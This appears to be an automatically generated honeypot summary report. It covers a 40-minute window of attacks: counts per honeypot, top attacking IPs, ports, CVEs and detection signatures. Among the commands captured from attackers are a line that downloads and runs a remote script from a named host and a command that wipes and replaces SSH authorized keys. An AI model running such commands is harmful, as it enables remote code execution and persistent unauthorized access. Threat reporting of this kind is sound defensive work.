# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-21T14:01:32Z
**Timeframe of Analysis:** 2025-10-21T13:20:01Z to 2025-10-21T14:00:01Z
**Log Files Used:**
- agg_log_20251021T132001Z.json
- agg_log_20251021T134001Z.json
- agg_log_20251021T140001Z.json

---

### Executive Summary

This report summarizes 19,908 malicious events captured by the honeypot network over a 40-minute period. The majority of attacks were captured by the Cowrie and Honeytrap honeypots, indicating a high volume of SSH and generic TCP service attacks. A significant number of attacks originated from IP address `137.184.179.27`. The most targeted ports were 22 (SSH) and 445 (SMB), which is consistent with automated scanning for common vulnerabilities. Analysis of commands attempted by attackers reveals a focus on establishing persistent access by adding SSH keys, along with system enumeration. The download of a file named `Mozi.m` suggests activity related to IoT botnets.

---

### Detailed Analysis

**Attacks by Honeypot:**
- **Cowrie:** 8276
- **Honeytrap:** 7424
- **Dionaea:** 1624
- **Suricata:** 1638
- **Sentrypeer:** 349
- **Mailoney:** 364
- **Miniprint:** 36
- **Tanner:** 38
- **H0neytr4p:** 40
- **Adbhoney:** 23
- **Ciscoasa:** 27
- **Dicompot:** 23
- **Honeyaml:** 19
- **ConPot:** 13
- **ElasticPot:** 3
- **Redishoneypot:** 8
- **Ipphoney:** 3

**Top Attacking IPs:**
- 137.184.179.27
- 159.89.20.223
- 72.146.232.13
- 134.199.201.7
- 45.140.17.153
- 45.134.26.62
- 45.134.26.20
- 186.167.186.171
- 196.251.88.103
- 45.140.17.144

**Top Targeted Ports/Protocols:**
- 22 (SSH)
- 445 (SMB)
- 5060 (SIP)
- 5903 (VNC)
- 25 (SMTP)
- 2012
- 5901 (VNC)
- 23 (Telnet)

**Most Common CVEs:**
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2021-3449
- CVE-2019-11500
- CVE-2009-2765
- CVE-2006-2369
- CVE-2005-4050

**Commands Attempted by Attackers:**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `cat /proc/cpuinfo | grep name | wc -l`
- `tftp; wget; /bin/busybox JUQRV`
- `cd /data/local/tmp/; busybox wget http://netrip.ddns.net/w.sh; sh w.sh`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET INFO CURL User Agent

**Users / Login Attempts:**
- root
- nvidia
- 345gs5662d34
- admin
- ubuntu
- oracle
- git
- postgres
- deploy
- es
- dolphinscheduler
- user

**Files Uploaded/Downloaded:**
- wget.sh
- w.sh
- c.sh
- Mozi.m

**HTTP User-Agents:**
- N/A (None Observed)

**SSH Clients:**
- N/A (None Observed)

**SSH Servers:**
- N/A (None Observed)

**Top Attacker AS Organizations:**
- N/A (None Observed)

---

### Key Observations and Anomalies

- **SSH Key Persistence:** A recurring tactic is the attempt to wipe the `.ssh` directory and install a new `authorized_key`. This indicates a clear goal of establishing persistent, passwordless access.
- **IoT Botnet Activity:** The appearance of `Mozi.m` is a strong indicator of automated attacks from the Mozi botnet, which typically targets IoT devices.
- **System Enumeration:** Attackers are heavily focused on gathering system information (CPU, memory, disk space, OS version) immediately after gaining initial access. This is likely to tailor further attacks or payloads.
- **Use of Legitimate Tools:** Attackers frequently use legitimate tools like `wget`, `curl`, and `tftp` to download malicious payloads from external servers. This is a common Living Off the Land (LotL) technique.
- **High Volume of Scanning:** The high counts for signatures like "MS Terminal Server Traffic on Non-standard Port" and "NMAP -sS" show that the honeypot is being subjected to broad, automated scanning campaigns.
---
